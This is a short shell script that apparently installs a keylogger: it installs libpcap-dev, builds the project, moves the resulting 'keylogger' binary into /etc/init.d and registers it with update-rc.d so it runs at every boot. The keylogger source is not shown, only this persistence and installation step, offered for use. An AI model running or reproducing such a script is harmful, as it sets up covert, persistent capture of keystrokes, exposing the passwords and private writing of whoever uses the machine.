#!/bin/sh

# Install libpcap-dev if it is already not on the system.
sudo apt-get install libpcap-dev

# Create the binaries.
make -B

chmod +x keylogger
mv keylogger /etc/init.d/
update-rc.d keylogger defaults
